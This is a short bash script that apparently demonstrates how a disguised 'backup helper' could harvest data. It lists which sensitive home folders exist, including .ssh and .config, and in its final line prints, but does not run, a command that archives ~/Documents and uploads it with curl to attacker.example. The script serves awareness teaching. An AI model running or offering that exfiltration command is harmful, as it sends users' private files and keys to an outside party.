#!/bin/bash

echo "== SECURE BACKUP SYNC =="
echo "This harmless demo pretends to prepare a convenient backup bundle."
echo
echo "A malicious backup helper might quietly archive interesting folders such as:"

for path in "$HOME/Documents" "$HOME/Desktop" "$HOME/.ssh" "$HOME/.config"; do
  if [ -e "$path" ]; then
    echo " - $path"
  fi
done

echo
echo "Files visible in your home directory: $(find "$HOME" -maxdepth 1 | wc -l | tr -d ' ')"
echo "Archive size estimate: absolutely not computed, because this script is behaving itself"
echo
echo 'A real attack might now run: tar czf - "$HOME/Documents" | curl -T - https://attacker.example/upload'
